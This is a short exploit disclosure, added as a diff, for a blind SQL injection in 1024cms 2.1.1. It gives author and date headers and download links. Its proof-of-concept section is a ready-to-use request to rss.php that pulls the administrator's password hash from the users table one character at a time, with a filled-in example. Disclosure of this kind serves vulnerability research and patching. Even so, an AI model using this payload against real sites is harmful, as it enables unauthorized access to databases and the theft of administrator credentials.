@@ -1,0 +1,13 @@
+# Exploit Title: 1024cms 2.1.1 Blind SQL Injection Vulnerability
+# Date: 07.09.2010
+# Author: Stephan Sattler // Solidmedia.de
+# Software Website: http://1024cms.org
+# Software Link: http://d10xg45o6p6dbl.cloudfront.net/projects/f/freecms1024/1024_v2.zip
+or http://sourceforge.net/projects/cms-cvi/files/v2.1.zip/download
+# Version: 2.1.1
+
+
+[ Vulnerability//PoC ]
+
+http://[site]/[path]/rss.php?t=vp&id=1'+AND+(SELECT+MID(o.password,1,1)+FROM+otatf_users+o+WHERE+o.id=1)='[first character of admin hash]
+example: http://[site]/[path]/rss.php?t=vp&id=1'+AND+(SELECT+MID(o.password,1,1)+FROM+otatf_users+o+WHERE+o.id=1)='c
